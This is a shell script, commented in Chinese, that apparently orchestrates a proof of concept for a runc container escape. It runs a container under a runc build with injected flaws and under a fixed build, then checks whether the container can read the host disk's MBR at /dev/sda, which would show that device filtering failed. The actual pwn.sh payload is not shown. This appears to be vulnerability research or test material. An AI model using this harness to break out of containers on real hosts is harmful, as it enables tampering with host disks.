#!/bin/sh
# INJ-A8-devices/run.sh — A8 完整 PoC 一键编排（需 root / cgroup v2 / 特权容器环境）
#
# 流程：放 pwn.sh 进 rootfs → 用 runc-vuln / runc-fixed 各跑一次容器 →
#       采集容器 stdout（磁盘 MBR 是否可读）→ 汇总证据
#
# 环境变量：
#   RUNCVULN=/tmp/runc-vuln         含 5 个注入的 runc
#   RUNCFIXED=/tmp/runc-fixed-bin   修复版对照（可选）
#   ROOTFS=/tmp/rootfs              busybox rootfs（需 sh/od/dd）
set -u
BIN_VULN=${RUNCVULN:-/tmp/runc-vuln}
BIN_FIXED=${RUNCFIXED:-/tmp/runc-fixed-bin}
ROOTFS=${ROOTFS:-/tmp/rootfs}
CTR=a8pwn
HERE=$(cd "$(dirname "$0")" && pwd)

[ -x "$BIN_VULN" ]  || { echo "缺 $BIN_VULN —— 先 cd runc && go build -o /tmp/runc-vuln ."; exit 1; }
[ -x "$BIN_FIXED" ] || echo "警告：缺 $BIN_FIXED，跳过差分对照"
[ -d "$ROOTFS/bin" ] || { echo "缺 rootfs $ROOTFS（需含 busybox）"; exit 1; }

# 1. 放 pwn 脚本进 rootfs，搭 bundle
cp "$HERE/pwn.sh" "$ROOTFS/pwn.sh" && chmod +x "$ROOTFS/pwn.sh"
mkdir -p "$HERE/bundle"
cp "$HERE/config.json" "$HERE/bundle/config.json"

# 2. 跑一次容器（$1=binary $2=tag）
run_one() {
    local bin=$1 tag=$2
    [ -x "$bin" ] || return 0
    echo ""
    echo "############ [$tag] ############"
    "$bin" run --bundle "$HERE/bundle" "$CTR-$tag" > "/tmp/a8-out-$tag.txt" 2>&1
    sed -n '1,70p' "/tmp/a8-out-$tag.txt"
    "$bin" delete -f "$CTR-$tag" 2>/dev/null
}

run_one "$BIN_VULN"  vuln
run_one "$BIN_FIXED" fixed

# 3. 证据汇总
echo ""
echo "===== 证据汇总 ====="
echo "-- rootfs 内 marker: $(cat "$ROOTFS/pwned-a8.txt" 2>/dev/null || echo 无)"
echo ""
echo ">> 解读："
echo "   vuln  : READ-OK + 出现真实分区表/55AA 签名 + marker=A8-PWNED → 设备过滤失效"
echo "   fixed : dd 报 Permission denied（cgroup eBPF 过滤拒绝）/dev/sda + marker=A8-BLOCKED"
echo "   （本 PoC 只读磁盘；真正攻击可写穿宿主磁盘/物理内存）"
